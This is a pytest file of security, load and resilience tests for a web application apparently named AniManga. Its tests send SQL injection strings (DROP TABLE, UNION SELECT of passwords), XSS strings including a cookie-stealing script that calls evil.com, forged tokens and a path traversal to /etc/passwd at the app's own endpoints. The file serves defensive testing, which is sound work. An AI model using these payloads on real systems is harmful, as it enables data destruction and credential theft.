# ABOUTME: Real security and performance integration tests for the entire application
# ABOUTME: Tests actual vulnerabilities, performance bottlenecks, and system behavior under load

"""
Security and Performance Integration Tests

Comprehensive security and performance testing:
- SQL injection, XSS, CSRF protection
- Authentication and authorization vulnerabilities
- Rate limiting and DOS protection
- Performance under load and stress testing
- Database query optimization
- Memory and resource usage
- All using real services and production-like scenarios
"""

import pytest
import json
import time
import concurrent.futures
import threading
from sqlalchemy import text


@pytest.mark.real_integration
@pytest.mark.security
class TestSecurityVulnerabilities:
    """Test for real security vulnerabilities in the application."""
    
    def test_sql_injection_protection_comprehensive(self, client, database_connection):
        """Comprehensive SQL injection testing across all endpoints."""
        
        # SQL injection payloads
        sql_payloads = [
            "'; DROP TABLE items; --",
            "' OR '1'='1",
            "' UNION SELECT id, email, password FROM users --",
            "'; DELETE FROM user_profiles WHERE '1'='1; --",
            "' OR 1=1 UNION SELECT null, username, password FROM users --",
            "admin'--",
            "admin' /*",
            "admin' #",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*",
            "') or '1'='1--",
            "') or ('1'='1--"
        ]
        
        # Test endpoints vulnerable to SQL injection
        vulnerable_endpoints = [
            ('/api/items', {'search': None, 'genres': None}),
            ('/api/recommendations/{}', {}),
            ('/api/social/users/search', {'q': None}),
        ]
        
        for endpoint_template, params in vulnerable_endpoints:
            for payload in sql_payloads:
                # Test in URL parameters
                if '{}' in endpoint_template:
                    endpoint = endpoint_template.format(payload)
                else:
                    endpoint = endpoint_template
                    
                # Add payload to parameters
                test_params = {}
                for param, _ in params.items():
                    test_params[param] = payload
                
                response = client.get(endpoint, query_string=test_params)
                
                # Should not return 500 (SQL error) or expose database errors
                assert response.status_code != 500
                
                if response.status_code == 200:
                    response_text = response.data.decode('utf-8')
                    # Should not contain SQL error messages
                    sql_error_indicators = [
                        'mysql_fetch_array',
                        'ORA-01756',
                        'Microsoft OLE DB',
                        'PostgreSQL query failed',
                        'Warning: mysql_',
                        'MySqlException',
                        'SQLException',
                        'ERROR: parser:',
                        'syntax error at or near'
                    ]
                    
                    for indicator in sql_error_indicators:
                        assert indicator not in response_text
                
                # Verify database integrity after each test
                with database_connection.begin():
                    # Check if critical tables still exist
                    result = database_connection.execute(
                        text("SELECT COUNT(*) FROM information_schema.tables WHERE table_name IN ('items', 'user_profiles', 'comments')")
                    )
                    assert result.scalar() >= 3  # Should have at least these tables
    
    def test_xss_protection_comprehensive(self, client, auth_headers, load_test_items, sample_items_data):
        """Comprehensive XSS protection testing."""
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>"
        ]
        
        # Test XSS in various input fields
        test_scenarios = [
            # Comments
            ('POST', '/api/social/comments/item/{}'.format(sample_items_data.iloc[0]['uid']), 
             {'content': None, 'is_spoiler': False}),
            
            # Reviews
            ('POST', '/api/social/reviews/{}'.format(sample_items_data.iloc[0]['uid']),
             {'overall_rating': 8, 'content': None, 'is_spoiler': False}),
            
            # Profile updates
            ('PUT', '/api/auth/profile',
             {'username': None, 'bio': None, 'location': None}),
            
            # Custom lists
            ('POST', '/api/auth/lists',
             {'title': None, 'description': None, 'is_public': True}),
        ]
        
        for method, endpoint, data_template in test_scenarios:
            for payload in xss_payloads:
                # Insert payload into each text field
                for field, _ in data_template.items():
                    if data_template[field] is None:  # Text field
                        test_data = data_template.copy()
                        test_data[field] = payload
                        
                        if method == 'POST':
                            response = client.post(
                                endpoint,
                                headers=auth_headers,
                                data=json.dumps(test_data),
                                content_type='application/json'
                            )
                        elif method == 'PUT':
                            response = client.put(
                                endpoint,
                                headers=auth_headers,
                                data=json.dumps(test_data),
                                content_type='application/json'
                            )
                        
                        # Should either reject or sanitize
                        if response.status_code in [200, 201]:
                            response_data = json.loads(response.data)
                            response_text = json.dumps(response_data)
                            
                            # Should not contain unescaped script tags
                            assert '<script>' not in response_text
                            assert 'javascript:' not in response_text
                            assert 'onerror=' not in response_text
                            assert 'onload=' not in response_text
                        else:
                            # Should reject with appropriate error
                            assert response.status_code in [400, 422]
    
    def test_authentication_bypass_attempts(self, client, test_user, auth_client):
        """Test various authentication bypass attempts."""
        
        # Generate valid token for comparison
        valid_token = auth_client.generate_jwt_token(test_user['id'])
        
        # Authentication bypass attempts
        bypass_attempts = [
            {'Authorization': 'Bearer ' + 'x' * 100},  # Random long token
            {'Authorization': 'Bearer null'},  # Null token
            {'Authorization': 'Bearer undefined'},  # Undefined token
            {'Authorization': 'Bearer admin'},  # Simple admin attempt
            {'Authorization': 'Bearer ' + valid_token[:-5] + 'admin'},  # Modified valid token
            {'Authorization': 'Basic YWRtaW46YWRtaW4='},  # Basic auth attempt
            {'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.invalid'},  # Malformed JWT
            {'X-Auth-Token': valid_token},  # Wrong header
            {'Authorization': valid_token},  # Missing Bearer
        ]
        
        protected_endpoints = [
            '/api/auth/dashboard',
            '/api/auth/user-items',
            '/api/auth/profile',
            '/api/auth/lists'
        ]
        
        for headers in bypass_attempts:
            headers['Content-Type'] = 'application/json'
            
            for endpoint in protected_endpoints:
                response = client.get(endpoint, headers=headers)
                
                # Should reject all bypass attempts
                assert response.status_code == 401
                
                data = json.loads(response.data)
                assert 'error' in data
    
    def test_authorization_escalation_attempts(self, client, multiple_test_users, auth_client):
        """Test privilege escalation and unauthorized access attempts."""
        
        # Create tokens for different users
        user1_token = auth_client.generate_jwt_token(multiple_test_users[0]['id'])
        user2_token = auth_client.generate_jwt_token(multiple_test_users[1]['id'])
        
        user1_headers = {
            'Authorization': f'Bearer {user1_token}',
            'Content-Type': 'application/json'
        }
        
        # User 1 creates a private resource
        private_list_data = {
            'title': 'Private List',
            'description': 'This should be private',
            'is_public': False
        }
        
        response = client.post(
            '/api/auth/lists',
            headers=user1_headers,
            data=json.dumps(private_list_data),
            content_type='application/json'
        )
        assert response.status_code == 201
        private_list_id = json.loads(response.data)['id']
        
        # User 2 attempts to access User 1's private resource
        user2_headers = {
            'Authorization': f'Bearer {user2_token}',
            'Content-Type': 'application/json'
        }
        
        # Should be denied access
        response = client.get(f'/api/auth/lists/{private_list_id}', headers=user2_headers)
        assert response.status_code in [403, 404]
        
        # User 2 attempts to modify User 1's resource
        response = client.put(
            f'/api/auth/lists/{private_list_id}',
            headers=user2_headers,
            data=json.dumps({'title': 'Hacked List'}),
            content_type='application/json'
        )
        assert response.status_code in [403, 404]
        
        # User 2 attempts to delete User 1's resource
        response = client.delete(f'/api/auth/lists/{private_list_id}', headers=user2_headers)
        assert response.status_code in [403, 404]
    
    def test_csrf_protection(self, client, auth_headers):
        """Test CSRF protection mechanisms."""
        
        # Test state-changing operations without proper headers
        csrf_test_requests = [
            ('POST', '/api/auth/lists', {'title': 'CSRF Test', 'is_public': True}),
            ('PUT', '/api/auth/profile', {'bio': 'CSRF attempt'}),
            ('DELETE', '/api/auth/lists/test-id', {}),
        ]
        
        for method, endpoint, data in csrf_test_requests:
            # Remove or modify CSRF protection headers
            malicious_headers = auth_headers.copy()
            malicious_headers['Origin'] = 'http://evil-site.com'
            malicious_headers['Referer'] = 'http://evil-site.com/attack'
            
            if method == 'POST':
                response = client.post(
                    endpoint,
                    headers=malicious_headers,
                    data=json.dumps(data),
                    content_type='application/json'
                )
            elif method == 'PUT':
                response = client.put(
                    endpoint,
                    headers=malicious_headers,
                    data=json.dumps(data),
                    content_type='application/json'
                )
            elif method == 'DELETE':
                response = client.delete(endpoint, headers=malicious_headers)
            
            # Should have CSRF protection (403) or be properly validated
            # Implementation may vary - either reject or validate origin
            assert response.status_code in [200, 201, 403, 404]
    
    def test_rate_limiting_protection(self, client, auth_headers):
        """Test rate limiting protection against DOS attacks."""
        
        # Rapid fire requests to test rate limiting
        responses = []
        start_time = time.time()
        
        for i in range(100):
            response = client.get('/api/auth/dashboard', headers=auth_headers)
            responses.append(response)
            
            # Don't overwhelm the test - small delay
            if i % 10 == 0:
                time.sleep(0.1)
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Check response patterns
        status_codes = [r.status_code for r in responses]
        success_count = status_codes.count(200)
        rate_limited_count = status_codes.count(429)
        
        # Should have some form of rate limiting or request throttling
        # Either through 429 responses or natural processing delays
        if duration < 5:  # If requests completed very quickly
            assert rate_limited_count > 0  # Should have rate limiting
        
        # Should not crash the server
        assert all(code in [200, 429, 503] for code in status_codes)


@pytest.mark.real_integration
@pytest.mark.performance
class TestPerformanceUnderLoad:
    """Test application performance under various load conditions."""
    
    def test_concurrent_user_load(self, client, multiple_test_users, auth_client, benchmark_timer):
        """Test performance with concurrent users."""
        
        def simulate_user_session(user_id):
            """Simulate a user session with multiple requests."""
            token = auth_client.generate_jwt_token(user_id)
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json'
            }
            
            # Simulate typical user workflow
            requests = [
                ('GET', '/api/auth/dashboard', {}),
                ('GET', '/api/auth/user-items', {}),
                ('GET', '/api/items', {'page': 1, 'per_page': 20}),
                ('GET', '/api/auth/profile', {}),
                ('GET', '/api/auth/lists', {}),
            ]
            
            session_responses = []
            for method, endpoint, params in requests:
                if method == 'GET':
                    response = client.get(endpoint, headers=headers, query_string=params)
                    session_responses.append(response.status_code)
                    time.sleep(0.1)  # Simulate user think time
            
            return session_responses
        
        # Test with concurrent users
        with benchmark_timer('concurrent_user_load'):
            with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
                # Submit concurrent user sessions
                futures = []
                for i in range(15):
                    user_id = multiple_test_users[i % len(multiple_test_users)]['id']
                    future = executor.submit(simulate_user_session, user_id)
                    futures.append(future)
                
                # Collect results
                results = [future.result() for future in futures]
        
        # Verify performance
        total_requests = sum(len(session) for session in results)
        successful_requests = sum(
            1 for session in results 
            for status in session 
            if status == 200
        )
        
        success_rate = successful_requests / total_requests
        assert success_rate > 0.8  # At least 80% success rate under load
    
    def test_database_query_performance(self, client, database_connection, load_test_items, benchmark_timer):
        """Test database query performance and optimization."""
        
        # Test various query patterns
        query_tests = [
            # Basic item queries
            ("SELECT * FROM items LIMIT 100", "basic_item_query"),
            
            # Filtered queries
            ("SELECT * FROM items WHERE media_type = 'anime' AND score >= 8.0 LIMIT 50", "filtered_query"),
            
            # Join queries
            ("""
                SELECT i.*, ui.status, ui.rating 
                FROM items i 
                LEFT JOIN user_items ui ON i.uid = ui.item_uid 
                WHERE ui.user_id = 'test-user-123'
                LIMIT 100
            """, "join_query"),
            
            # Aggregation queries
            ("""
                SELECT media_type, COUNT(*), AVG(score) 
                FROM items 
                GROUP BY media_type
            """, "aggregation_query"),
            
            # Complex search query
            ("""
                SELECT * FROM items 
                WHERE (title ILIKE '%anime%' OR synopsis ILIKE '%anime%')
                AND score >= 7.0 
                ORDER BY score DESC 
                LIMIT 20
            """, "search_query")
        ]
        
        for query, test_name in query_tests:
            with benchmark_timer(f'db_query_{test_name}'):
                with database_connection.begin():
                    result = database_connection.execute(text(query))
                    rows = result.fetchall()
                    
                # Verify query returns reasonable results
                assert len(rows) >= 0
    
    def test_api_endpoint_performance(self, client, load_test_items, auth_headers, benchmark_timer):
        """Test individual API endpoint performance."""
        
        # Test critical endpoints
        endpoint_tests = [
            ('GET', '/api/items', {}, 'items_endpoint'),
            ('GET', '/api/items', {'page': 1, 'per_page': 50, 'media_type': 'anime'}, 'filtered_items'),
            ('GET', '/api/auth/dashboard', {}, 'dashboard'),
            ('GET', '/api/auth/user-items', {}, 'user_items'),
            ('GET', '/api/auth/lists', {}, 'user_lists'),
        ]
        
        for method, endpoint, params, test_name in endpoint_tests:
            headers = auth_headers if 'auth' in endpoint else {}
            
            with benchmark_timer(f'api_{test_name}'):
                for _ in range(10):  # Multiple requests for average
                    if method == 'GET':
                        response = client.get(endpoint, headers=headers, query_string=params)
                        assert response.status_code == 200
    
    def test_memory_usage_under_load(self, client, auth_headers, benchmark_timer):
        """Test memory usage patterns under sustained load."""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB
        
        with benchmark_timer('memory_load_test'):
            # Simulate sustained load
            for i in range(200):
                response = client.get('/api/items', query_string={'page': (i % 10) + 1})
                assert response.status_code == 200
                
                # Check memory every 50 requests
                if i % 50 == 0:
                    current_memory = process.memory_info().rss / 1024 / 1024
                    memory_growth = current_memory - initial_memory
                    
                    # Memory growth should be reasonable (less than 100MB)
                    assert memory_growth < 100
        
        final_memory = process.memory_info().rss / 1024 / 1024
        total_growth = final_memory - initial_memory
        
        # Total memory growth should be reasonable
        assert total_growth < 200  # Less than 200MB growth
    
    def test_response_time_consistency(self, client, load_test_items, benchmark_timer):
        """Test response time consistency under varying load."""
        
        response_times = []
        
        with benchmark_timer('response_time_consistency'):
            for i in range(100):
                start_time = time.time()
                response = client.get('/api/items', query_string={'page': (i % 5) + 1})
                end_time = time.time()
                
                response_time = (end_time - start_time) * 1000  # milliseconds
                response_times.append(response_time)
                
                assert response.status_code == 200
        
        # Calculate statistics
        avg_response_time = sum(response_times) / len(response_times)
        max_response_time = max(response_times)
        min_response_time = min(response_times)
        
        # Performance assertions
        assert avg_response_time < 1000  # Average < 1 second
        assert max_response_time < 5000  # Max < 5 seconds
        assert min_response_time < 100   # Min < 100ms
        
        # Consistency check - 95% of requests should be within 2x average
        threshold = avg_response_time * 2
        within_threshold = sum(1 for rt in response_times if rt <= threshold)
        consistency_rate = within_threshold / len(response_times)
        
        assert consistency_rate >= 0.95  # 95% consistency
    
    def test_caching_performance_impact(self, client, cache_client, load_test_items, 
                                      sample_items_data, benchmark_timer):
        """Test performance impact of caching mechanisms."""
        
        item_uid = sample_items_data.iloc[0]['uid']
        
        # Clear cache first
        cache_client.clear_memory()  # Clear memory cache for testing
        
        # Measure performance without cache
        with benchmark_timer('without_cache'):
            for _ in range(20):
                response = client.get(f'/api/recommendations/{item_uid}')
                # May be slower without cache
                assert response.status_code in [200, 404]
        
        # Let cache populate
        time.sleep(1)
        
        # Measure performance with cache
        with benchmark_timer('with_cache'):
            for _ in range(20):
                response = client.get(f'/api/recommendations/{item_uid}')
                # Should be faster with cache
                assert response.status_code in [200, 404]
        
        # Cache should improve performance (measured in benchmark results)


@pytest.mark.real_integration
@pytest.mark.performance
class TestStressAndResilience:
    """Test application behavior under stress conditions."""
    
    def test_high_concurrent_writes(self, client, multiple_test_users, auth_client, 
                                  load_test_items, sample_items_data, benchmark_timer):
        """Test high concurrent write operations."""
        
        def concurrent_write_operation(user_index):
            """Perform concurrent write operations."""
            user_id = multiple_test_users[user_index % len(multiple_test_users)]['id']
            token = auth_client.generate_jwt_token(user_id)
            headers = {
                'Authorization': f'Bearer {token}',
                'Content-Type': 'application/json'
            }
            
            operations = []
            
            # Create multiple user items
            for i in range(5):
                item_data = {
                    'status': 'watching',
                    'rating': (i % 10) + 1,
                    'progress': i
                }
                
                response = client.post(
                    f'/api/auth/user-items/concurrent_test_{user_index}_{i}',
                    headers=headers,
                    data=json.dumps(item_data),
                    content_type='application/json'
                )
                operations.append(response.status_code)
            
            return operations
        
        with benchmark_timer('concurrent_writes'):
            with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
                # Submit concurrent write operations
                futures = [
                    executor.submit(concurrent_write_operation, i)
                    for i in range(50)
                ]
                
                # Collect results
                results = [future.result() for future in futures]
        
        # Verify results
        total_operations = sum(len(ops) for ops in results)
        successful_operations = sum(
            1 for ops in results 
            for status in ops 
            if status in [200, 201]
        )
        
        success_rate = successful_operations / total_operations
        assert success_rate > 0.7  # At least 70% success rate under high concurrency
    
    def test_error_recovery_and_resilience(self, client, database_connection, auth_headers):
        """Test application recovery from various error conditions."""
        
        # Test recovery from database connection issues
        # (Simulated by invalid queries that don't break the connection)
        
        # Make normal request
        response = client.get('/api/auth/dashboard', headers=auth_headers)
        assert response.status_code == 200
        
        # Simulate some stress on database
        try:
            with database_connection.begin():
                # Execute a complex query that might stress the database
                database_connection.execute(
                    text("""
                        SELECT COUNT(*) FROM items i1 
                        CROSS JOIN items i2 
                        WHERE i1.score > 8 AND i2.score > 8
                        LIMIT 1000
                    """)
                )
        except Exception:
            # Some stress queries might fail, that's OK
            pass
        
        # Application should still respond normally
        response = client.get('/api/auth/dashboard', headers=auth_headers)
        assert response.status_code == 200
        
        # Test recovery from invalid requests
        invalid_requests = [
            ('GET', '/api/items', {'page': -1}),
            ('GET', '/api/items', {'per_page': 10000}),
            ('GET', '/api/recommendations/nonexistent'),
            ('POST', '/api/auth/lists', {'invalid': 'data'}),
        ]
        
        for method, endpoint, params in invalid_requests:
            if method == 'GET':
                response = client.get(endpoint, headers=auth_headers, query_string=params)
            elif method == 'POST':
                response = client.post(
                    endpoint,
                    headers=auth_headers,
                    data=json.dumps(params),
                    content_type='application/json'
                )
            
            # Should handle errors gracefully
            assert response.status_code in [400, 404, 422]
            
            # Should return valid JSON
            try:
                json.loads(response.data)
            except json.JSONDecodeError:
                pytest.fail(f"Invalid JSON response for {method} {endpoint}")
        
        # Normal requests should still work after errors
        response = client.get('/api/auth/dashboard', headers=auth_headers)
        assert response.status_code == 200
    
    def test_resource_exhaustion_protection(self, client, auth_headers, benchmark_timer):
        """Test protection against resource exhaustion attacks."""
        
        # Test large payload handling
        large_data = {
            'title': 'x' * 10000,  # Very long title
            'description': 'y' * 50000,  # Very long description
            'tags': ['tag' + str(i) for i in range(1000)],  # Many tags
            'is_public': True
        }
        
        response = client.post(
            '/api/auth/lists',
            headers=auth_headers,
            data=json.dumps(large_data),
            content_type='application/json'
        )
        
        # Should either reject or handle gracefully
        assert response.status_code in [200, 201, 400, 413, 422]
        
        # Test many simultaneous requests
        def make_request():
            return client.get('/api/items', query_string={'page': 1})
        
        with benchmark_timer('resource_exhaustion_test'):
            with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                futures = [executor.submit(make_request) for _ in range(200)]
                responses = [future.result() for future in futures]
        
        # Should handle load without crashing
        success_count = sum(1 for r in responses if r.status_code == 200)
        rate_limited_count = sum(1 for r in responses if r.status_code == 429)
        error_count = sum(1 for r in responses if r.status_code >= 500)
        
        # Should not have server errors
        assert error_count < len(responses) * 0.1  # Less than 10% server errors
        
        # Should have some success or proper rate limiting
        assert (success_count + rate_limited_count) > len(responses) * 0.8


@pytest.mark.real_integration
@pytest.mark.security
@pytest.mark.performance
class TestProductionReadiness:
    """Test production readiness and deployment considerations."""
    
    def test_configuration_security(self, app):
        """Test security of application configuration."""
        
        # Check that sensitive configurations are properly set
        assert app.config.get('SECRET_KEY') != 'dev'
        assert app.config.get('JWT_SECRET_KEY') != 'dev'
        
        # Debug should be disabled in production-like testing
        if not app.config.get('TESTING'):
            assert app.config.get('DEBUG') is False
        
        # Check that sensitive data is not exposed
        response_data = str(app.config)
        sensitive_patterns = [
            'password',
            'secret',
            'key',
            'token'
        ]
        
        # Configuration should not contain obvious sensitive data
        for pattern in sensitive_patterns:
            assert pattern.lower() not in response_data.lower()
    
    def test_error_information_disclosure(self, client):
        """Test that errors don't disclose sensitive information."""
        
        # Test various error conditions
        error_tests = [
            ('GET', '/nonexistent-endpoint'),
            ('POST', '/api/auth/lists', 'invalid-json'),
            ('GET', '/api/items/../../etc/passwd'),  # Path traversal attempt
            ('GET', '/api/items', {'page': 'invalid'}),
        ]
        
        for method, endpoint, *args in error_tests:
            if method == 'GET':
                response = client.get(endpoint, query_string=args[0] if args else {})
            elif method == 'POST':
                response = client.post(endpoint, data=args[0] if args else '{}')
            
            # Should not expose sensitive information
            response_text = response.data.decode('utf-8')
            
            sensitive_info = [
                '/home/',
                '/var/',
                'Traceback',
                'File "/',
                'line ',
                'Exception:',
                'Error:',
                'Warning:',
                'postgresql://',
                'mysql://',
                'redis://',
                'SECRET_KEY',
                'JWT_SECRET'
            ]
            
            for info in sensitive_info:
                assert info not in response_text
    
    def test_logging_and_monitoring_readiness(self, client, auth_headers):
        """Test that application provides adequate logging for monitoring."""
        
        # Make various requests that should be logged
        requests = [
            ('GET', '/api/items'),
            ('GET', '/api/auth/dashboard'),
            ('POST', '/api/auth/lists', {'title': 'Test List', 'is_public': True}),
            ('GET', '/nonexistent'),  # 404 error
        ]
        
        for method, endpoint, *args in requests:
            if method == 'GET':
                if 'auth' in endpoint:
                    response = client.get(endpoint, headers=auth_headers)
                else:
                    response = client.get(endpoint)
            elif method == 'POST':
                response = client.post(
                    endpoint,
                    headers=auth_headers,
                    data=json.dumps(args[0]) if args else '{}',
                    content_type='application/json'
                )
            
            # Application should handle all requests (with appropriate responses)
            assert response.status_code in [200, 201, 400, 401, 404, 422]
            
            # Should return valid JSON for API endpoints
            if endpoint.startswith('/api/'):
                try:
                    json.loads(response.data)
                except json.JSONDecodeError:
                    if response.status_code != 404:  # 404 might not be JSON
                        pytest.fail(f"Invalid JSON for API endpoint: {endpoint}")
    
    def test_health_check_and_readiness(self, client, database_connection, cache_client):
        """Test health check and readiness endpoints."""
        
        # Basic health check
        response = client.get('/')
        assert response.status_code == 200
        assert b"AniManga" in response.data
        
        # Database connectivity
        with database_connection.begin():
            result = database_connection.execute(text("SELECT 1"))
            assert result.scalar() == 1
        
        # Cache connectivity
        assert cache_client.ping() is True
        
        # If health check endpoint exists, test it
        health_endpoints = ['/health', '/api/health', '/status']
        for endpoint in health_endpoints:
            response = client.get(endpoint)
            if response.status_code == 200:
                # Should return health status
                try:
                    health_data = json.loads(response.data)
                    assert 'status' in health_data
                except json.JSONDecodeError:
                    # Health check might return plain text
                    pass